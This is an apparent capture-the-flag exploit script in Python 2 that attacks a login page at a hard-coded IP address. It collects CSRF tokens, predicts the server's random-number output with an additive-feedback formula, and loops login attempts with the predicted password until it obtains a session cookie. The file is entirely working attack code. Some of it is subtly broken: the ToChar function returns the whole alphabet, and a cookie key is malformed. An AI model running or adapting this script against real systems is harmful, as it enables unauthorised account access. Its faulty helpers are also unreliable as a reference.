#!/usr/bin/python
# -*- coding: UTF-8 -*-
 
import random
import requests
import re
import string
 
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
url = 'http://114.215.220.241'
 
s = requests.session()
s.headers = {
        "User-Agent":
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.63 Safari/537.36"
    }
 
 
def ToNum(s):
    return [chars.find(i) for i in s]
 
def ToChar(s):
    return ''.join([chars for i in s])
 
def Random(n):
    return ''.join(random.choice(string.letters+string.digits) for _ in range(n))
 
def CsrfToken():
    loginUrl = url + '/login.php'
    s.headers['Cookie'] = "PHPSESSID={};".format(Random(16))
    res = s.get(loginUrl).content
    txt = re.search(r'id="csrfToken" value=(\w+)', res)
    if txt:
        return txt.group(1)
    else:
        return
 
def CrackToken():
    rand = []
    predict = []
 
    for i in range(2):
        nums = ToNum(CsrfToken())
        rand.extend(nums)
 
    loginToken = CsrfToken()
    rand.extend(ToNum(loginToken))
 
    for i in range(len(rand),len(rand)+4):
        rand.append((rand[i-31] + rand[i-3]) % len(chars))
    predict.extend(rand[-4:])
 
    predictToken = ToChar(predict)
    return loginToken, predictToken
 
if __name__ == '__main__':
    cLoginUrl = url + '/checkLogin.php'
 
    while 1:
        loginToken, predictToken = CrackToken()
 
        username = 'tgbdsf'
        payload = {
            'username': username,
            'password': predictToken,
            'csrfToken': loginToken,
            'submit': 'Login'
        }
 
        cookies = {
            "PHPSESSID=": Random(32)
        }
 
        res = s.post(cLoginUrl , data=payload, cookies=cookies).content
 
        if 'success' in res:
            print s.headers['Cookie']
            break
